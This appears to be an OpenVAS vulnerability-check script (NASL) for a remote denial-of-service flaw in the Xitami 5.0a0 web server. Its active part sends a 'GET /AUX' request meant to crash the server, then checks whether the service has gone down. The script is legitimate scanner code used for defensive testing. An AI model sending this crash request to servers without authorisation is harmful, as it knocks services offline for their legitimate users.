###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xitami_40027.nasl 14 2013-10-27 12:33:37Z jan $
#
# Xitami '/AUX' Request Remote Denial Of Service Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Xitami is prone to a denial-of-service vulnerability.

Attackers can exploit this issue to crash the affected application,
denying service to legitimate users.

Xitami 5.0a0 is vulnerable.";


if (description)
{
 script_id(100633);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-05-11 20:07:01 +0200 (Tue, 11 May 2010)");
 script_bugtraq_id(40027);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_name("Xitami '/AUX' Request Remote Denial Of Service Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/40027");
 script_xref(name : "URL" , value : "http://www.imatix.com/products");

 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if Xitami is prone to a denial-of-service vulnerability");
 script_category(ACT_DENIAL);
 script_family("Denial of Service");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}


include("http_func.inc");

if(safe_checks())exit(0);

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

soc = http_open_socket(port);
if(!soc)exit(0);

send(socket: soc, data: string("GET /AUX HTTP/1.0\r\n\r\n"));
close(soc);

sleep(2);

if(http_is_dead(port:port)) {

  security_warning(port:port);
  exit(0); 

}  

exit(0);
